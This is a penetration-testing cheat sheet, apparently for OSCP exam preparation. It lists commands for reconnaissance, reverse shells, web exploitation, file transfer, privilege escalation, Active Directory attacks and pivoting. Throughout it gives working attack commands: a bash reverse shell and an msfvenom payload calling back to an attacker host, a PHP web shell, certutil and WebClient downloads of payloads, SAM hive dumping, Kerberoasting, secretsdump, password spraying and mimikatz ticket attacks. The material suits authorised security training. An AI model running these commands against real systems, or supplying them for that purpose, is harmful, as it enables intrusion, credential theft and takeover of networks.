# Reconnaissance

nmap -p- -sV IP
sudo nmap -p- -sSU IP

sh  ~/tools/Enum/nmapAutomator.sh --host <IP> -t all

searchsploit

Google: service version exploit github

nikto -h http://URL

```
wpscan --url https://<RHOST> --enumerate u,t,p
wpscan --url https://<RHOST> --plugins-detection aggressive
wpscan --url https://<RHOST> --disable-tls-checks
```

curl -v http://

ftp: anonymous connection
ftp IP

smbclient -L //<RHOST>/ -N

Ping sweep with bash:
```
#Host scan:
for i in {1..255}; do (ping -c 1 192.168.1.${i} | grep "bytes from" &); done

#Port scan:
for i in {1..65535}; do (echo > /dev/tcp/192.168.1.1/$i) >/dev/null 2>&1 && echo $i is open; done
```

# Reverse shell

https://www.revshells.com/

bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1


rlwrap nc -nvlp 6666

msfvenom -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f c -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai


# Web exploitation

dirsearch -u http://

```
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://<RHOST>/
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/big.txt -u http://<RHOST>/ -x php
gobuster dir -w /usr/share/wordlists/dirb/big.txt -u http://<RHOST>/ -x php,txt,html,js -e -s 200
```

```
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://<RHOST>/FUZZ --fs <NUMBER> -mc all
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://<RHOST>/FUZZ --fw <NUMBER> -mc all
ffuf -u http://localhost/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-words-lowercase.txt -e .php,.html,.txt
```

feroxbuster -u http://IP -w $DIRMEDIUM -x php,txt,html

PHP shell:
`<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>`

# File transfer

`certutil -urlcache -split -f "http://<LHOST>/<FILE>" <FILE>`

`Invoke-WebRequest -Uri http://<LHOST>:<LPORT>/<FILE> -Outfile C:\\temp\\<FILE>`

(new-object System.Net.WebClient).DownloadFile('http://192.168.119.138:800/file.exe','file.exe')

```
nc -lnvp <LPORT> < <FILE>
nc <RHOST> <RPORT> > <FILE>
```

Impacket smbserver.py:
smbserver.py share -smb2support . -username "peon" -password "peon"
smbserver.py share -smb2support .

On the Windows host:
```
# Set the credential
$pass = ConvertTo-SecureString 'peon' -AsPlainText -Force
$pass
$cred = New-Object System.Management.Automation.PSCredential('peon', $pass)
$cred

# Connect to the SMB server
New-PSDrive -Name peon -PSProvider FileSystem -Credential $cred -Root \\IP\smbfolder

# Access the share
cd peon
dir
```

# Privilege escalation

systeminfo
whoami /all
net users
net users <USERNAME>
tasklist /SVC
sc query
sc qc <SERVICE>
netsh firewall show state

Check the others directories

net user <USERNAME> <PASSWORD> /add /domain
net group "Exchange Windows Permissions" /add <USERNAME>
net localgroup "Remote Management Users" /add <USERNAME>

Enable RDP:
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh advfirewall firewall set rule group="remote desktop" new enable=yes

Privileges on Windows:
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
reg query HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer

Dumpt SAM password hash and try to crack it:
reg save hklm\system C:\Users\<USERNAME>\system.hive
reg save hklm\sam C:\Users\<USERNAME>\sam.hive

Import-Module .\<FILE>

Linux

id
sudo -l
uname -a
cat /etc/hosts
cat /etc/fstab
cat /etc/passwd
ss -tulpn
ps -auxf
ls -lahv
ls -R /home
ls -la /opt
env

find / -perm -u=s -type f 2>/dev/null
find / -perm -4000 2>/dev/null | xargs ls -la

# Active directory

net user /domain
net group /domain
net view /domain

Check for passwords stored

Check for hash or tickets.

Check with Bloodhound if nothing else is find

Kerberoasting:
impacket-GetUserSPNs -dc-ip <DC-IP> <domain>/<user>:<pass> -request

Secretsdump:
secretsdump.py <domain>/<user>:<password>@<IP>

Powerview:
Import-Moduel .\PowerView.ps1
Get-NetDomain
Get-NetUser
Get-NetGroup
Get-NetComputer
Get-NetSession -ComputerName files04 -Verbose
Get-NetUser -SPN | select samaccountname,serviceprincipalname
Get-ObjectAcl -Identity <user>
Convert-SidToName <sid/objsid>

crackmapexec smb <IP or subnet> -u users.txt -p 'pass' -d <domain> --continue-on-success
kerbrute passwordspray -d corp.com .\usernames.txt "pass"

Pass the ticket
mimikatz

Golden ticket
mimikatz

# Pivoting/Port Forwarding

cmd.exe /c echo y | .\plink.exe -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -N

./chisel server -p 9002 -reverse -v
./chisel client <RHOST>:9002 R:9003:127.0.0.1:8888

ssh user@<RHOST> -oKexAlgorithms=+diffie-hellman-group1-sha1

ssh -R 8080:<LHOST>:80 <RHOST>
ssh -L 8000:127.0.0.1:8000 <USERNAME>@<RHOST>
ssh -N -L 1234:127.0.0.1:1234 <USERNAME>@<RHOST>

ssh -L 80:<LHOST>:80 <RHOST>
ssh -L 127.0.0.1:80:<LHOST>:80 <RHOST>
ssh -L 80:localhost:80 <RHOST>

Proxies:
ssh -D 1337 user@172.16.0.5 -fN

sshuttle -r USERS@10.11.1.251 10.1.1.0/24
sshuttle -r USER@MACHINE_IP 0.0.0.0/0

psexec.py <domain>/<user>:<password1>@<IP>
psexec.py -hashes

# Interactive shell

```bash
# In reverse shell
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
Ctrl-Z

# In Kali
$ stty raw -echo
$ fg

# In reverse shell
$ reset
$ export SHELL=bash
$ export TERM=xterm-256color
$ stty rows <num> columns <cols>

# For zsh
# Use rlwrap for setting the listener
$ rlwrap nc -lvnp 

# Use python to get a bash
ctrl + z
# Type in one line
$ stty size;stty raw -echo;fg

# Then
$ stty rows ROWS cols COLS
$ export TERM=xterm-256color
$ exec /bin/bash
```

# Useful Ressources

https://github.com/xsudoxx/OSCP

https://github.com/0xsyr0/OSCP

https://github.com/brianlam38/OSCP-2022/blob/main/cheatsheet-active-directory.md